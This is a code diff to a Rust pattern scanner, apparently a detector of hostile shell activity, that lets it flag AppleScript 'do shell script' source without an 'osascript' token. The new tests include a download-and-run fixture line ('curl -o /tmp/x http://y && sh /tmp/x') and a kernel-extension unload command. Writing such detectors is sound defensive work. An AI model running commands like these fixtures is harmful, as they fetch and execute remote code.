@@ -576,7 +576,9 @@ fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATT
                     d.subcommand = true;
                 }
             }
-            b"do" if st.osascript.is_some() && words_follow(line, e, &[b"shell", b"script"]) => {
+            b"do" if words_follow(line, e, &[b"shell", b"script"]) => {
+                // AppleScript source needs no `osascript` token.
+                st.osascript.get_or_insert(s);
                 st.osascript_runs_shell = true;
             }
             b"curl" | b"wget" => {
@@ -1046,6 +1048,16 @@ mod tests {
         assert!(none_fire(
             "curl x -o f; osascript -e 'do shell script \"ls\"'"
         ));
+    }
+
+    #[test]
+    fn applescript_source_needs_no_osascript_token() {
+        assert!(fires(
+            "do shell script \"curl -o /tmp/x http://y && sh /tmp/x\"",
+            OSASCRIPT_DOWNLOAD
+        ));
+        assert!(none_fire("do shell script \"kextunload -b com.example.x\""));
+        assert!(none_fire("curl x; do shell script \"ls\""));
     }
 
     #[test]
